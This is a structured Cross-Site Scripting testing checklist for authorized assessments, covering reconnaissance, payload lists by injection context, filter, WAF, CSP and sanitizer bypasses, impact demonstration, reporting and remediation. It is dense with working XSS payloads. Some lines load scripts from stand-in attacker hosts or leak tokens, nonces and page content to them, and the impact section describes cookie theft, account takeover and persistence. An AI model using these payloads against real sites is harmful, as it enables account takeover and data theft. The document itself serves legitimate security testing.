# XSS Testing Checklist

> **Companion document:** [XSS Mutation/Variation Taxonomy](./xss.md)
> **Purpose:** A context-driven checklist for systematically discovering, confirming, and escalating Cross-Site Scripting vulnerabilities. Organized by **injection context** — because where your input lands determines which payloads work.

---

## Phase 0 — Pre-Engagement Setup

### 0-1. Tooling

| Component | Tool | Purpose |
|---|---|---|
| **Proxy** | Burp Suite Professional | Intercept, modify, replay requests |
| **DOM Analysis** | DOM Invader (Burp built-in) | Automated source→sink tracing, prototype pollution scanning |
| **Blind XSS** | XSS Hunter / custom callback server | OOB payload reporting with DOM snapshots |
| **Scanner** | XSStrike, Burp Active Scan | Intelligent XSS fuzzing with browser-engine verification |
| **CSP Evaluator** | Google CSP Evaluator | Identify CSP weaknesses before testing |
| **Payload Reference** | PortSwigger XSS Cheat Sheet (2026 Edition) | Context-specific payload database |
| **Encoding Helper** | CyberChef, Burp Decoder | Multi-layer encoding/decoding |

### 0-2. Target Reconnaissance

```
□ Identify client-side framework: React / Angular / Vue / Svelte / vanilla JS
□ Check CSP headers: Content-Security-Policy, report-uri/report-to
□ Check X-Content-Type-Options: nosniff presence
□ Check cookie attributes: HttpOnly, Secure, SameSite
□ Identify HTML sanitizers in use: DOMPurify version, Bleach, custom
□ Identify template engine: Jinja2, Handlebars, ERB, EJS, Twig, etc.
□ Identify Markdown/rich-text rendering libraries
□ Note all input reflection points: parameters, headers, path segments
```

### 0-3. Quick CSP Assessment

Run CSP through Google CSP Evaluator. Flag these as bypass-relevant:

```
□ 'unsafe-inline' in script-src          → Direct inline injection possible
□ 'unsafe-eval' in script-src            → eval(), Function(), setTimeout(string)
□ Wildcard (*) in script-src             → Load external attacker scripts
□ data: in script-src                    → data: URI script execution
□ JSONP endpoint on allowed domain       → Callback parameter injection
□ *.googleapis.com, *.cloudflare.com     → Known JSONP/library hosting
□ Missing base-uri directive             → <base> tag hijacking
□ Missing object-src directive           → <object>/<embed> injection
□ Nonce present but static/predictable   → Nonce reuse
□ No CSP at all                          → All inline/external scripts allowed
```

---

## Phase 1 — Reflection Discovery

> **Goal:** Map every location where user input appears in the HTTP response.

### 1-1. Parameter Reflection Mapping

```
For each input parameter (query, body, header, cookie, path segment):

□ Inject a unique canary string: themap12345xss
□ Search the full HTTP response (headers + body) for the canary
□ For each reflection point, note:
  - WHERE it lands: HTML body, attribute value, JavaScript block,
    URL context, CSS context, HTTP header
  - HOW it's encoded: raw, HTML-entity-encoded, JS-escaped,
    URL-encoded, or double-encoded
  - WHAT characters survive: < > " ' ` / \ ( ) { } ; = :
```

### 1-2. Character Probe

For each reflection point, send a character probe to map which characters are available:

```
Probe string: themap<>"'`;/\(){}=:
              (or URL-encoded equivalent)

Record which characters appear:
□ < and > survive unencoded    → Tag injection possible (§1)
□ " survives unencoded         → Double-quote attribute breakout (§2)
□ ' survives unencoded         → Single-quote attribute/JS breakout (§2, §3)
□ ` survives unencoded         → Template literal injection (§3)
□ ( and ) survive unencoded    → Function call in JS context (§3)
□ / survives unencoded         → Closing tag injection, regex breakout
□ ; survives unencoded         → JS statement termination (§3)
□ { and } survive unencoded    → Template expression injection (§9)
□ \ survives unencoded         → Escape sequence manipulation (§3)
```

### 1-3. DOM Source Discovery

Use DOM Invader or manual inspection:

```
□ Enable DOM Invader in Burp's embedded browser
□ Check for DOM sources flowing to dangerous sinks:
  - location.hash → innerHTML / document.write / eval
  - location.search → innerHTML / document.write / eval
  - document.referrer → DOM manipulation
  - window.name → DOM manipulation
  - postMessage data → DOM manipulation / eval
  - localStorage/sessionStorage → DOM rendering
□ Check for prototype pollution sources (URL params like __proto__, constructor)
□ Check for DOM clobbering opportunities (id/name attributes controlling JS vars)
```

---

## Phase 2 — Context-Specific Exploitation

> Based on Phase 1 results, use the appropriate context checklist below.
> Each context section is self-contained — jump directly to whichever applies.

---

### Context A: HTML Element Context (Taxonomy §1)

**When:** Input is reflected between HTML tags (not inside an attribute or script block).
**Available characters needed:** `<` and `>` minimum.

```
# A-1. Direct tag injection
□ <script>alert(1)</script>
□ <script src=https://CALLBACK_SERVER/x.js></script>
□ <script type=module>import('https://CALLBACK_SERVER/x.js')</script>

# A-2. Event handler elements (auto-firing — no user interaction)
□ <img src=x onerror=alert(1)>
□ <svg onload=alert(1)>
□ <body onload=alert(1)>
□ <input autofocus onfocus=alert(1)>
□ <video><source onerror=alert(1)>
□ <details open ontoggle=alert(1)>
□ <marquee onstart=alert(1)>
□ <div contenteditable autofocus onfocus=alert(1)>

# A-3. Embedded objects
□ <iframe srcdoc="<script>alert(1)</script>">
□ <iframe src="javascript:alert(1)">
□ <object data="data:text/html,<script>alert(1)</script>">
□ <embed src="javascript:alert(1)">
□ <svg><foreignObject><body onload=alert(1)>

# A-4. Base tag hijacking (if relative script paths exist on page)
□ <base href="https://ATTACKER_SERVER/">

# A-5. If <script> is blocked but other tags allowed:
□ <img src=x onerror=alert(1)>                      (most common fallback)
□ <svg><animate onbegin=alert(1) attributeName=x>
□ <math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
```

---

### Context B: HTML Attribute Context (Taxonomy §2)

**When:** Input is reflected inside an HTML attribute value.
**First determine:** Is the attribute quoted with `"`, `'`, or unquoted?

```
# B-1. Double-quoted attribute breakout (value is in "...")
□ " onmouseover=alert(1) x="                     (inject new attribute)
□ " autofocus onfocus=alert(1) x="                (auto-fire)
□ "><script>alert(1)</script>                      (break out of tag entirely)
□ "><img src=x onerror=alert(1)>                   (break out, new element)

# B-2. Single-quoted attribute breakout (value is in '...')
□ ' onmouseover=alert(1) x='
□ ' autofocus onfocus=alert(1) x='
□ '><script>alert(1)</script>

# B-3. Unquoted attribute (value has no quotes)
□ x onmouseover=alert(1)                           (space creates new attribute)
□ x autofocus onfocus=alert(1)

# B-4. Special attribute semantics (if input lands in href, src, action, etc.)
□ javascript:alert(1)                               (in href/src/action)
□ javascript:void(0);alert(1)
□ data:text/html,<script>alert(1)</script>           (in src/href)
□ &#106;avascript:alert(1)                           (HTML entity encoded 'j')
□ java%0ascript:alert(1)                             (newline in scheme)
□ java\tscript:alert(1)                              (tab in scheme)

# B-5. Hidden input exploitation
□ " accesskey=x onclick=alert(1)                    (requires Alt+Shift+X)
□ " type=image src=x onerror=alert(1)               (change type to image)

# B-6. SVG animate href manipulation
□ <svg><a><animate attributeName=href values=javascript:alert(1)><text>click</text>
```

---

### Context C: JavaScript Context (Taxonomy §3)

**When:** Input is reflected inside a `<script>` block or inline JavaScript.
**First determine:** Is input inside a string literal (`'...'`, `"..."`, `` `...` ``)?

```
# C-1. String literal breakout (single-quoted)
□ ';alert(1);//
□ \';alert(1);//                     (if server adds \ before ', this escapes the \)
□ </script><script>alert(1)</script>  (HTML parser beats JS parser)

# C-2. String literal breakout (double-quoted)
□ ";alert(1);//
□ \";alert(1);//
□ </script><script>alert(1)</script>

# C-3. Template literal breakout (backtick)
□ ${alert(1)}
□ `+alert(1)+`

# C-4. No string context (input directly in JS expression)
□ alert(1)
□ ;alert(1);//
□ -alert(1)-

# C-5. Script block closure (works from ANY JS context)
□ </script><img src=x onerror=alert(1)>
□ </script><script>alert(1)</script>

# C-6. Dynamic code execution sinks (DOM XSS)
□ Check if input reaches: eval(), Function(), setTimeout(string),
  setInterval(string), document.write(), innerHTML, outerHTML,
  jQuery.html(), $.append(), v-html, dangerouslySetInnerHTML
□ For each sink found: trace the source → can attacker control it?
```

---

### Context D: URL/URI Context (Taxonomy §4)

**When:** Input is reflected in a URL attribute (`href`, `src`, `action`, etc.) or used in JavaScript URL handling (`location.href = ...`, `window.open(...)`, redirect targets).

```
# D-1. Protocol injection
□ javascript:alert(1)
□ data:text/html,<script>alert(1)</script>
□ data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==

# D-2. Encoded scheme bypasses (if "javascript:" is filtered)
□ &#106;avascript:alert(1)                    (HTML entity for 'j')
□ &#x6A;avascript:alert(1)                    (hex HTML entity)
□ java%0ascript:alert(1)                       (URL-encoded newline)
□ java%09script:alert(1)                       (URL-encoded tab)
□ java%0dscript:alert(1)                       (URL-encoded carriage return)
□ %6A%61%76%61%73%63%72%69%70%74:alert(1)      (fully URL-encoded)
□ jAvAsCrIpT:alert(1)                          (mixed case)
□ javascript://anything%0aalert(1)             (authority confusion)

# D-3. Open redirect to XSS
□ If redirect endpoint exists:
  /redirect?url=javascript:alert(1)
  /redirect?url=data:text/html,<script>alert(1)</script>

# D-4. DOM-based URL manipulation
□ location.href = userInput                    (check for validation)
□ window.open(userInput)                       (check for validation)
□ document.location = userInput
□ location.assign(userInput)
```

---

### Context E: CSS Context (Taxonomy §5)

**When:** Input is reflected inside a `<style>` block, `style` attribute, or CSS file.

```
# E-1. CSS data exfiltration (scriptless — bypasses CSP)
□ input[value^="a"]{background:url(https://CALLBACK_SERVER/?a)}
  (iterate per character to leak attribute values — CSRF tokens, nonces)
□ script[nonce^="a"]{background:url(https://CALLBACK_SERVER/?a)}
  (leak CSP nonce character by character)

# E-2. @import injection
□ @import url(https://ATTACKER_SERVER/exfil.css);
□ </style><script>alert(1)</script>                (break out of style block)

# E-3. Legacy CSS execution (IE only — low priority)
□ background: expression(alert(1))
□ behavior: url(xss.htc)
```

---

### Context F: Framework-Specific Contexts (Taxonomy §9)

```
# F-1. AngularJS (1.x) — if ng-app directive present
□ {{constructor.constructor('alert(1)')()}}
□ {{$on.constructor('alert(1)')()}}

# F-2. Vue.js — if v-html or template compilation exists
□ Check for v-html directives rendering user data
□ If server-side + client-side templates mixed: {{constructor.constructor('alert(1)')()}}

# F-3. React — check for dangerous patterns
□ dangerouslySetInnerHTML={{__html: userInput}}
□ SSR hydration mismatch: server-rendered XSS payload preserved in client

# F-4. Markdown rendering
□ [click](javascript:alert(1))
□ [click](&#106;avascript:alert(1))
□ <script>alert(1)</script>                        (if raw HTML passthrough enabled)
□ <img src=x onerror=alert(1)>                     (if img tags allowed)
□ ![x](data:text/html,<script>alert(1)</script>)

# F-5. Server-side template injection → XSS
□ {{7*7}}                     → if 49 appears, template injection exists
□ ${7*7}                      → EL / Freemarker
□ <%= 7*7 %>                  → ERB
□ {7*7}                       → Twig/Smarty
□ If template injection confirmed: escalate to full SSTI/RCE
```

---

## Phase 3 — Defense Bypass Techniques

> Apply when Phase 2 payloads are blocked by filters, WAFs, sanitizers, or CSP.

### 3-1. Tag/Keyword Blocking Bypass

```
# If <script> is blocked:
□ <ScRiPt>alert(1)</ScRiPt>                          (case variation)
□ <scr\x00ipt>alert(1)</script>                       (null byte)
□ <script/x>alert(1)</script>                         (slash as space)
□ <script\t\n>alert(1)</script>                       (whitespace padding)
□ Use alternative elements: <img>, <svg>, <details>, <body>, <input>, <video>

# If alert() is blocked:
□ confirm(1)
□ prompt(1)
□ window['al'+'ert'](1)
□ self[atob('YWxlcnQ=')](1)
□ [].constructor.constructor('alert(1)')()
□ Reflect.apply(alert,null,[1])
□ alert`1`                                            (template literal tag)
□ \u0061lert(1)                                       (unicode escape)
□ top['alert'](1)

# If () parentheses are blocked:
□ alert`1`
□ onerror=alert;throw 1
□ location='javascript:alert\x281\x29'
□ import('https://ATTACKER_SERVER/x.js')

# If event handlers (onerror, onload, etc.) are blocked:
□ Try less common events: ontoggle, onanimationstart, onbegin,
  oncontentvisibilityautostatechange, onwebkitplaybacktargetavailabilitychanged
□ <details open ontoggle=alert(1)>
□ <div style="animation:x" onanimationstart=alert(1)>
  (requires @keyframes x {} in a style block)
```

### 3-2. WAF Bypass Techniques

```
# HTTP Parameter Pollution
□ ?q=<script>&q=alert(1)&q=</script>
  (server may concatenate: ASP.NET joins with ',')
□ ?q[]=<script>&q[]=alert(1)</script>

# Encoding layers
□ Double URL encoding: %253Cscript%253E → %3Cscript%3E → <script>
□ HTML entity encoding in attribute context: &#x3C;script&#x3E;
□ Unicode escapes in JS context: \u003cscript\u003e
□ Mixed encoding: URL-encode parts, entity-encode others

# Null byte / whitespace injection
□ <scr%00ipt>alert(1)</script>
□ <img%09src=x%09onerror=alert(1)>
□ <img%0asrc=x%0aonerror=alert(1)>

# Comment insertion
□ <scr<!--test-->ipt>alert(1)</script>
```

### 3-3. CSP Bypass Techniques

```
# If unsafe-inline is not set but JSONP endpoints exist on allowed domain:
□ <script src="https://allowed-cdn.com/jsonp?callback=alert(1)//"></script>
□ <script src="https://allowed-cdn.com/angular.min.js"></script>
  (load AngularJS from CDN, then use template injection)

# If base-uri is missing:
□ <base href="https://ATTACKER_SERVER/">
  (all relative script paths now load from attacker server)

# If nonce-based CSP:
□ Leak nonce via CSS: script[nonce^="..."] { background:url(...) }
□ Check if nonce is static across requests (reload page, compare nonce values)
□ Injection before the nonced script tag → share its nonce

# If strict-dynamic is set:
□ Find an existing trusted script that creates new script elements
□ Prototype pollution → modify script creation behavior

# If data: is allowed in script-src:
□ <script src="data:text/javascript,alert(1)"></script>
```

### 3-4. Sanitizer Bypass (DOMPurify, Bleach, etc.)

```
# Mutation XSS (mXSS) — sanitizer and browser parse DOM differently
□ <math><mtext><table><mglyph><style><!--</style><img src onerror=alert(1)>
□ <svg><p><style><g title="</style><img src onerror=alert(1)>">
□ Deeply nested elements (node flattening): 100+ nested <div> wrappers

# Prototype pollution → sanitizer bypass
□ If prototype pollution source exists:
  Pollute Object.prototype.after or Object.prototype.innerHTML before
  DOMPurify initialization

# Check DOMPurify version (CVE mapping):
□ < 2.0.17: namespace confusion mXSS
□ ≤ 3.0.8: prototype pollution bypass (CVE-2024-45801)
□ < 3.1.3: node flattening mXSS (CVE-2024-47875)
□ < 3.2.4: template regex bypass (CVE-2025-26791)
```

---

## Phase 4 — Advanced Techniques

### 4-1. DOM Clobbering (Taxonomy §6-1)

```
When HTML injection exists but script execution is blocked (strict CSP):

□ Identify JS code that reads DOM properties: window.x, document.x, x.y
□ Inject elements with matching id/name:
  <img id="x" src="https://ATTACKER_SERVER/">
  <a id="x"><a id="x" name="y" href="javascript:alert(1)">
  <form id="x"><input name="y" value="attacker-controlled">

□ Check for known clobberable gadgets:
  - Webpack: import.meta.url → <img name=import> clobbers module loading
  - Google Analytics: transport_url → clobber to attacker script
  - Library checks like `if (typeof x !== 'undefined')` → clobber x
```

### 4-2. postMessage Exploitation (Taxonomy §6-3)

```
□ Search JS for: addEventListener('message', ...)
□ Check if origin validation exists:
  - No check at all → exploitable from any origin
  - e.origin.indexOf('trusted.com') → bypass with trusted.com.attacker.com
  - e.origin === 'https://trusted.com' → strict, hard to bypass
□ Check what happens with message data:
  - Flows to innerHTML → XSS via message
  - Flows to eval() → direct code execution
  - Flows to location.href → open redirect / javascript: XSS
□ Check for postMessage with wildcard: parent.postMessage(data, '*')
  → data leaks to any embedding origin
```

### 4-3. Prototype Pollution to XSS (Taxonomy §6-2)

```
□ Enable DOM Invader prototype pollution scanning
□ Test URL parameters: ?__proto__[test]=polluted
□ Test URL hash: #__proto__[test]=polluted
□ Test JSON body: {"__proto__":{"test":"polluted"}}
□ If pollution confirmed, scan for gadgets:
  - Object.prototype.innerHTML → inject into unset innerHTML reads
  - Object.prototype.src → inject into script/img loading
  - Object.prototype.href → inject into link/anchor construction
  - Object.prototype.srcdoc → inject into iframe creation
```

### 4-4. Blind XSS (Taxonomy §11-2)

```
Deploy XSS Hunter (or equivalent) payload in all inputs that might be
rendered in admin/internal contexts:

□ Contact forms / support tickets
□ User-Agent header (logged and displayed in analytics)
□ Referer header (logged and displayed in analytics)
□ Username / display name fields
□ Feedback forms
□ Error reports
□ Order notes / comments
□ File metadata (EXIF, filename)

Payload template:
"><script src=https://YOUR_XSSHUNTER.xss.ht></script>
"><img src=x onerror=import('https://YOUR_XSSHUNTER.xss.ht')>
```

### 4-5. Service Worker Persistence (Taxonomy §11-1)

```
If XSS is confirmed and HTTPS is in use:

□ Check if a service worker is already registered:
  navigator.serviceWorker.getRegistrations()
□ Check if you can register a new one:
  navigator.serviceWorker.register('/path/to/attacker-sw.js')
  (requires a JS file served from same origin — look for JSONP or file upload)
□ If existing SW uses cache API:
  Poison cached responses with XSS payloads
□ Service worker persists across sessions (~40 days average)
  → most powerful XSS persistence mechanism
```

### 4-6. Scriptless Data Exfiltration (Taxonomy §11-3)

```
When CSP blocks all script execution but HTML injection exists:

# Dangling markup — capture subsequent page content
□ <img src='https://ATTACKER_SERVER/?leak=
  (captures everything until next single-quote as part of URL)
□ <form action='https://ATTACKER_SERVER/?leak=
  (captures form data including CSRF tokens)
□ <textarea>
  (captures page content until closing tag)
□ <base href='https://ATTACKER_SERVER/'>
  (redirects all relative URLs to attacker)

# CSS-based exfiltration (if style injection exists)
□ Attribute value leak: input[value^="a"]{background:url(https://ATTACKER/?a)}
□ CSP nonce leak: script[nonce^="a"]{background:url(https://ATTACKER/?a)}
```

---

## Phase 5 — Impact Demonstration

### 5-1. Impact Proof Matrix

| Impact Level | Proof Method | Notes |
|---|---|---|
| **Critical: ATO** | Steal session cookie (`document.cookie`) or auth token, replay to access victim account | Only if cookie lacks `HttpOnly` |
| **Critical: ATO (HttpOnly)** | Use XSS to make authenticated API calls (change email/password), or steal CSRF token + execute state-changing action | Works even with `HttpOnly` cookies |
| **High: Data theft** | Read sensitive DOM content, API responses, or cross-origin data via postMessage | Demonstrate specific data accessible |
| **High: Persistent** | Register service worker or poison cache for long-term control | Show persistence across page reloads |
| **Medium: Phishing** | Inject fake login form overlaying the real page | Show convincing credential harvester |
| **Medium: Stored** | Payload fires for other users viewing the same content | Demonstrate cross-user impact |
| **Low: Self-XSS** | Payload only fires in attacker's own session | Low impact; document as informational |

### 5-2. Proof-of-Concept Requirements

```
□ Use alert(document.domain) instead of alert(1) — proves execution origin
□ Capture screenshot of the alert / DevTools console
□ For stored XSS: demonstrate it fires in a different user session (use incognito)
□ For DOM XSS: provide the exact URL containing the payload
□ For blind XSS: show XSS Hunter callback with DOM snapshot
□ If session hijack: show the stolen cookie/token value (redacted in report)
□ If ATO chain: demonstrate the full attack flow step by step
□ Minimize payload: prefer alert(document.domain) over complex chains for clarity
```

---

## Phase 6 — Reporting

### 6-1. Severity Guide

| Type | Severity | Justification |
|---|---|---|
| Stored XSS in main application | **High–Critical** | Fires for other users; potential ATO or worm |
| Reflected XSS (no CSP) | **Medium–High** | Requires victim to click link; session hijack possible |
| Reflected XSS (strict CSP) | **Low–Medium** | CSP limits exploitation; scriptless exfiltration may still work |
| DOM XSS | **Medium–High** | Client-side only; often bypasses server-side WAFs |
| Self-XSS | **Informational–Low** | Only affects attacker's own session |
| Blind XSS (admin panel) | **High–Critical** | Fires in privileged context; admin ATO |
| mXSS (sanitizer bypass) | **High–Critical** | Affects all users of the sanitizer; wide blast radius |

### 6-2. Report Template

```markdown
## Title
[Stored/Reflected/DOM] Cross-Site Scripting in [Feature/Parameter]

## Summary
[1-2 sentences: injection context, defense bypass if any, maximum impact]

## Impact
- Attacker can execute arbitrary JavaScript in victim's browser on [origin]
- This enables: [session hijack / ATO / data theft / phishing / etc.]
- Affected users: [all users viewing X / users clicking crafted link / admin users]

## Steps to Reproduce
1. [Navigate to / Send request to] [URL]
2. In the [parameter/field], enter: [payload]
3. [For reflected: open the URL / For stored: navigate to the page where content renders]
4. Observe JavaScript execution (alert box / callback received)

## Payload Used
[exact payload string]

## Injection Context
[HTML element / Attribute value (double-quoted) / JavaScript string literal / etc.]

## Defenses Bypassed
[WAF name / sanitizer + version / CSP policy — if applicable]

## HTTP Request
[Full request from Burp]

## Proof of Concept
[Screenshot of alert(document.domain) / XSS Hunter callback / session hijack demo]

## Remediation
[See §6-3]
```

### 6-3. Remediation Recommendations

```markdown
## Output Encoding (Primary Defense)
- Apply context-aware output encoding at the template level:
  - HTML context: encode < > & " '
  - Attribute context: encode all non-alphanumeric characters
  - JavaScript context: use JSON serialization, never concatenate into JS
  - URL context: validate scheme allowlist (http/https only), then URL-encode
  - CSS context: CSS hex-encode all non-alphanumeric characters
- Use framework auto-escaping (React JSX, Vue {{ }}, Jinja2 autoescape)
- NEVER use raw/unescaped output: v-html, dangerouslySetInnerHTML,
  |safe, {{{ }}}, <%== %>, raw()

## Content Security Policy
- Deploy strict CSP: script-src 'nonce-{random}' 'strict-dynamic';
  base-uri 'self'; object-src 'none';
- Generate unique nonce per request (not static)
- Remove 'unsafe-inline' and 'unsafe-eval'
- Eliminate JSONP endpoints on allowed domains

## Additional Defenses
- Set X-Content-Type-Options: nosniff on all responses
- Set HttpOnly, Secure, SameSite=Strict/Lax on session cookies
- Deploy Trusted Types for DOM XSS sink protection
- Keep HTML sanitizers (DOMPurify) updated to latest version
- Validate and sanitize all user input at semantic level
- Set Content-Disposition: attachment on user-uploaded files when possible
```

---

## Appendix A — Quick Checklist (Time-Constrained Testing)

```
[ ] 1. Inject canary string in all parameters → find reflection points
[ ] 2. Send character probe (<>"'`;/\(){}=:) → map available characters
[ ] 3. Based on context:
      - HTML body + < > available → <img src=x onerror=alert(1)>
      - Attribute + " available   → " autofocus onfocus=alert(1) x="
      - JS string + ' available   → ';alert(1);//
      - URL context               → javascript:alert(1)
[ ] 4. If blocked: try case variation, encoding, alternative tags/events
[ ] 5. Run DOM Invader for client-side sources/sinks
[ ] 6. Deploy blind XSS payload in all admin-visible inputs
[ ] 7. Check CSP → attempt bypass if present
```

## Appendix B — Context Identification Cheat Sheet

| Reflection Location | Example in Source | Context | Go To |
|---|---|---|---|
| Between tags | `<div>REFLECTED</div>` | HTML Element | Context A |
| Inside attribute (quoted) | `<input value="REFLECTED">` | Attribute | Context B |
| Inside attribute (unquoted) | `<input value=REFLECTED>` | Attribute | Context B §3 |
| In href/src/action | `<a href="REFLECTED">` | URL/URI | Context D |
| Inside `<script>` block | `var x = 'REFLECTED';` | JavaScript | Context C |
| Inside template literal | `` var x = `REFLECTED`; `` | JavaScript | Context C §3 |
| Inside `<style>` block | `.class { color: REFLECTED }` | CSS | Context E |
| In HTTP response header | `X-Custom: REFLECTED` | HTTP Header | §10 CRLF injection |
| In framework template | `{{ REFLECTED }}` | Framework | Context F |

## Appendix C — Payload Priority by Context

**HTML Element Context — Top 5 Payloads:**
```
1. <img src=x onerror=alert(document.domain)>
2. <svg onload=alert(document.domain)>
3. <input autofocus onfocus=alert(document.domain)>
4. <details open ontoggle=alert(document.domain)>
5. <script>alert(document.domain)</script>
```

**Attribute Breakout — Top 5 Payloads:**
```
1. " autofocus onfocus=alert(document.domain) x="
2. " onmouseover=alert(document.domain) x="
3. "><img src=x onerror=alert(document.domain)>
4. ' autofocus onfocus=alert(document.domain) x='
5. " tabindex=0 onfocus=alert(document.domain) x="
```

**JavaScript String — Top 5 Payloads:**
```
1. '</script><script>alert(document.domain)</script>
2. ';alert(document.domain);//
3. ";alert(document.domain);//
4. \';alert(document.domain);//
5. ${alert(document.domain)}
```

**URL Context — Top 5 Payloads:**
```
1. javascript:alert(document.domain)
2. javascript://anything%0aalert(document.domain)
3. data:text/html,<script>alert(document.domain)</script>
4. &#106;avascript:alert(document.domain)
5. java%0ascript:alert(document.domain)
```

---

*This checklist is intended for authorized security assessments and defensive security research purposes only.*
